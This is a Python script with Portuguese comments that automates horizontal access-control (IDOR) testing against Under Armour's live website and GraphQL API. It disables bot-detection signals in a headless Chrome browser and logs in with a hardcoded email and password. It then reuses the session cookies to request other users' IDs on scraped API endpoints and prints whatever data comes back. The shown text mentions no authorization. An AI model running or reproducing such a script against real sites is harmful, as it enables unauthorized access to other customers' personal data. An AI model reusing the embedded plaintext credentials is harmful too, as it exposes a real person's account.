#!/usr/bin/env python3
"""
Script para testes de BAC Horizontal na Under Armour usando Selenium
Contorna proteção anti-bot usando navegador real
"""

import time
import json
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import TimeoutException, NoSuchElementException

class UnderArmourBACTest:
    def __init__(self):
        self.base_url = "https://www.underarmour.com"
        self.email = "pedroocferreira@gmail.com"
        self.password = "@Pedro9cce22f2"
        self.driver = None
        self.session_cookies = None
        
    def setup_driver(self):
        """Configura o driver do Chrome com opções para contornar detecção"""
        print("🔧 Configurando navegador...")
        
        chrome_options = Options()
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--user-data-dir=/tmp/chrome-test-profile")
        chrome_options.add_argument("--headless")  # Modo headless para ambiente sem GUI
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-plugins")
        chrome_options.add_argument("--disable-images")
        chrome_options.add_argument("--disable-javascript")  # Desabilitar JS pode ajudar com proteção
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        
        # Usar webdriver-manager para baixar automaticamente o ChromeDriver
        service = Service(ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=service, options=chrome_options)
        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
    def login(self):
        """Faz login no site da Under Armour"""
        print("🔐 Fazendo login...")
        
        try:
            self.driver.get(f"{self.base_url}/login")
            time.sleep(3)
            
            # Preencher email
            email_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "email"))
            )
            email_field.send_keys(self.email)
            
            # Preencher senha
            password_field = self.driver.find_element(By.NAME, "password")
            password_field.send_keys(self.password)
            
            # Clicar em login
            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()
            
            # Aguardar login
            WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.CLASS_NAME, "user-menu"))
            )
            
            print("✅ Login realizado com sucesso!")
            
            # Salvar cookies para usar em requisições
            self.session_cookies = self.driver.get_cookies()
            
        except TimeoutException:
            print("❌ Timeout no login")
            return False
        except Exception as e:
            print(f"❌ Erro no login: {e}")
            return False
            
        return True
    
    def discover_endpoints(self):
        """Descobre endpoints navegando pelo site"""
        print("🔍 Descobrindo endpoints...")
        
        endpoints = []
        
        try:
            # Navegar para diferentes seções
            sections = [
                "/profile",
                "/account", 
                "/workouts",
                "/orders",
                "/photos",
                "/dashboard"
            ]
            
            for section in sections:
                try:
                    self.driver.get(f"{self.base_url}{section}")
                    time.sleep(2)
                    
                    # Capturar requisições de rede
                    logs = self.driver.get_log('performance')
                    for log in logs:
                        message = json.loads(log['message'])
                        if message['message']['method'] == 'Network.responseReceived':
                            url = message['message']['params']['response']['url']
                            if '/api/' in url:
                                endpoints.append(url)
                                
                except Exception as e:
                    print(f"⚠️ Erro ao acessar {section}: {e}")
                    
        except Exception as e:
            print(f"❌ Erro na descoberta: {e}")
            
        return list(set(endpoints))
    
    def test_bac_horizontal(self, endpoint):
        """Testa BAC Horizontal em um endpoint específico"""
        print(f"🎯 Testando BAC Horizontal: {endpoint}")
        
        # Converter cookies do Selenium para requests
        session = requests.Session()
        for cookie in self.session_cookies:
            session.cookies.set(cookie['name'], cookie['value'])
        
        # Testar diferentes IDs
        test_ids = [1, 2, 3, 999, 1000, 9999]
        
        for test_id in test_ids:
            try:
                # Construir URL de teste
                if '?' in endpoint:
                    test_url = f"{endpoint}&id={test_id}"
                else:
                    test_url = f"{endpoint}?id={test_id}"
                
                # Fazer requisição
                response = session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    print(f"  🚨 POSSÍVEL BAC HORIZONTAL! ID {test_id} acessível")
                    print(f"  URL: {test_url}")
                    
                    # Verificar se retorna dados
                    try:
                        data = response.json()
                        if data and len(str(data)) > 50:
                            print(f"  📊 Dados retornados: {str(data)[:200]}...")
                            return True
                    except:
                        if len(response.text) > 50:
                            print(f"  📊 Resposta: {response.text[:200]}...")
                            return True
                            
                elif response.status_code == 403:
                    print(f"  ✅ Protegido (403) - ID {test_id}")
                elif response.status_code == 401:
                    print(f"  ✅ Protegido (401) - ID {test_id}")
                elif response.status_code == 404:
                    print(f"  ❌ Não encontrado (404) - ID {test_id}")
                else:
                    print(f"  ⚠️ Resposta inesperada ({response.status_code}) - ID {test_id}")
                    
            except Exception as e:
                print(f"  ❌ Erro ao testar ID {test_id}: {e}")
                
        return False
    
    def test_graphql_endpoint(self):
        """Testa o endpoint GraphQL específico"""
        print("🔍 Testando endpoint GraphQL...")
        
        graphql_url = "https://api.shop.ua.com/graphql"
        
        # Converter cookies do Selenium para requests
        session = requests.Session()
        for cookie in self.session_cookies:
            session.cookies.set(cookie['name'], cookie['value'])
        
        # Testar introspection query
        introspection_query = {
            "query": "query IntrospectionQuery { __schema { queryType { name } } }"
        }
        
        try:
            response = session.post(
                graphql_url,
                json=introspection_query,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                },
                timeout=10
            )
            
            if response.status_code == 200:
                print("✅ GraphQL endpoint ativo!")
                data = response.json()
                print(f"📊 Resposta: {json.dumps(data, indent=2)[:500]}...")
                return True
            else:
                print(f"❌ GraphQL endpoint inativo (HTTP {response.status_code})")
                
        except Exception as e:
            print(f"❌ Erro ao testar GraphQL: {e}")
            
        return False
    
    def run_tests(self):
        """Executa todos os testes"""
        print("🚀 Iniciando testes de BAC Horizontal na Under Armour...")
        
        try:
            # Configurar navegador
            self.setup_driver()
            
            # Fazer login
            if not self.login():
                print("❌ Falha no login. Encerrando testes.")
                return
            
            # Descobrir endpoints
            endpoints = self.discover_endpoints()
            print(f"📋 Endpoints descobertos: {len(endpoints)}")
            for endpoint in endpoints:
                print(f"  - {endpoint}")
            
            # Testar BAC Horizontal
            vulnerabilities_found = 0
            for endpoint in endpoints:
                if self.test_bac_horizontal(endpoint):
                    vulnerabilities_found += 1
            
            # Testar GraphQL
            if self.test_graphql_endpoint():
                vulnerabilities_found += 1
            
            # Resumo
            print(f"\n🎯 Testes concluídos!")
            print(f"📊 Vulnerabilidades encontradas: {vulnerabilities_found}")
            print(f"📋 Endpoints testados: {len(endpoints)}")
            
        except Exception as e:
            print(f"❌ Erro geral: {e}")
            
        finally:
            if self.driver:
                self.driver.quit()

if __name__ == "__main__":
    tester = UnderArmourBACTest()
    tester.run_tests()
